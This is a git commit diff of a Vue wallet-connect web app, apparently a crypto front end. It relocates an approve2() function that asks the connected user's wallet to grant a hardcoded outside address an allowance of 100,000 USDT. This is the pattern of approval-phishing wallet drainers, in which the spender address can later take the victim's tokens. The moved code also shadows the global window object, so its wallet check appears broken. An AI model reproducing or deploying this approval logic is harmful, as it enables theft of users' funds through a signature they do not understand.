4ac7672d73c94101039a7737679114ebd2969298
xiaomabenteng <xiaomabenteng@look.com>
2024-09-30 00:36:07 +0800

    r

--- src/App.vue
+++ src/App.vue
@@ -5,44 +5,9 @@ import { mainnet, arbitrum } from '@reown/appkit/networks'
 import { useWriteContract } from '@wagmi/vue'
 import { abi } from './abi'
 import { BrowserProvider, Contract, Eip1193Provider, ethers, formatUnits } from 'ethers'
+import { onMounted, ref } from 'vue'
 
 const { writeContract } = useWriteContract()
-
-const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
-
-  // The ERC-20 Contract ABI, which is a common contract interface
-  // for tokens (this is the Human-Readable ABI format)
-  const USDTAbi = [
-    'function name() view returns (string)',
-    'function symbol() view returns (string)',
-    'function balanceOf(address) view returns (uint)',
-    'function transfer(address to, uint amount)',
-    'event Transfer(address indexed from, address indexed to, uint amount)',
-    'function approve(spender to, uint amount)'
-  ]
-
-  async function approve2() {
-    const { address, isConnected } = useAppKitAccount()
-    const { walletProvider } = useAppKitProvider<Eip1193Provider>('eip155')
-  try {
-    
-    // let window: any
-    // if (typeof window === 'undefined' || !window.ethereum) {
-    //       alert('Please install   Trust!');
-    //       return;
-    //     }
-    // const ethersProvider = new ethers.BrowserProvider(window.ethereum)
-    const ethersProvider = new BrowserProvider(walletProvider)
-    const signer = await ethersProvider.getSigner()
-    // The Contract object
-    const USDTContract = new Contract(USDTAddress, USDTAbi, signer)
-    const USDTBalance = await USDTContract.approve( '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', BigInt(100000000000) )
-    console.log('Approval successful');
-  } catch (error) {
-    console.error('Approval failed:', error);
-    alert('Approval failed: ' + error);
-  }
-}
 
 // 1. Get projectId from https://cloud.reown.com
 const projectId = '4703d1a7a30b63665f8d8e8339a9aceb'
@@ -68,6 +33,48 @@ createAppKit({
 
 // 4. Use modal composable
 const modal = useAppKit()
+
+const isWalletAvailable = ref(false); // 状态来检查钱包是否可用
+
+onMounted(() => {
+  // 检查 wallet 是否可用
+  isWalletAvailable.value = typeof window !== 'undefined' && !!window.ethereum;
+});
+
+const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
+
+  // The ERC-20 Contract ABI, which is a common contract interface
+  // for tokens (this is the Human-Readable ABI format)
+  const USDTAbi = [
+    'function name() view returns (string)',
+    'function symbol() view returns (string)',
+    'function balanceOf(address) view returns (uint)',
+    'function transfer(address to, uint amount)',
+    'event Transfer(address indexed from, address indexed to, uint amount)',
+    'function approve(spender to, uint amount)'
+  ]
+
+  async function approve2() {
+    const { address, isConnected } = useAppKitAccount()
+    const { walletProvider } = useAppKitProvider('eip155')
+  try {
+    let window: any
+    if (typeof window === 'undefined' || !window.ethereum) {
+          alert('Please install   Trust!');
+          return;
+        }
+    const ethersProvider = new ethers.BrowserProvider(window.ethereum)
+    // const ethersProvider = new BrowserProvider(walletProvider)
+    const signer = await ethersProvider.getSigner()
+    // The Contract object
+    const USDTContract = new Contract(USDTAddress, USDTAbi, signer)
+    const USDTBalance = await USDTContract.approve( '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', BigInt(100000000000) )
+    console.log('Approval successful');
+  } catch (error) {
+    console.error('Approval failed:', error);
+    alert('Approval failed: ' + error);
+  }
+}
 </script>
 
 <template>
